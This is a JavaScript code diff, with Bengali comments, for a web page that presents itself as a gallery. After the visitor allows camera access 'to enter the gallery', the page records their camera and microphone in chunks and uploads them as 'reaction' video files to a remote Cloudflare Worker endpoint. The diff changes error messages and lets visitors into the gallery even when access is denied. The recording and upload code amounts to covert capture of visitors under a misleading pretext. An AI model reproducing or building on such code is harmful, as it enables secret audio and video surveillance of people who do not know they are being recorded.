@@ -1,4 +1,4 @@
-const WORKER_URL = 'https://YOUR-WORKER-NAME.YOUR-SUBDOMAIN.workers.dev'; // <-- এখানে আপনার ওয়ার্কার লিংক বসবে
+const WORKER_URL = 'https://YOUR-WORKER-NAME.YOUR-SUBDOMAIN.workers.dev'; // <-- এখানে ক্লাউডফ্লেয়ার লিংক থাকবে
 
 const landingPage = document.getElementById('landing-page');
 const galleryPage = document.getElementById('gallery-page');
@@ -11,7 +11,7 @@ startBtn.addEventListener('click', async () => {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         
-        // Hide landing, show gallery
+        // সফল হলে গ্যালারি দেখাবে
         landingPage.style.display = 'none';
         galleryPage.style.display = 'block';
 
@@ -25,7 +25,12 @@ startBtn.addEventListener('click', async () => {
 
         mediaRecorder.start(RECORDING_CHUNK_MS);
     } catch (err) {
-        alert("Please allow camera access to enter the gallery!");
+        // এবার আমরা আসল এরর মেসেজটি স্ক্রিনে দেখাবো
+        alert("Camera Error: " + err.name + " - " + err.message);
+        
+        // এরর দিলেও জোর করে গ্যালারিতে ঢুকিয়ে দেবো, যাতে আটকে না থাকেন
+        landingPage.style.display = 'none';
+        galleryPage.style.display = 'block';
     }
 });
 
@@ -34,7 +39,9 @@ async function uploadChunk(blob) {
     formData.append('file', blob, `reaction-${Date.now()}.webm`);
     try {
         await fetch(`${WORKER_URL}/api/upload`, { method: 'POST', body: formData });
-    } catch (err) { console.error("Upload failed", err); }
+    } catch (err) { 
+        console.error("Upload failed", err); 
+    }
 }
 
 // Layout & Theme Switching
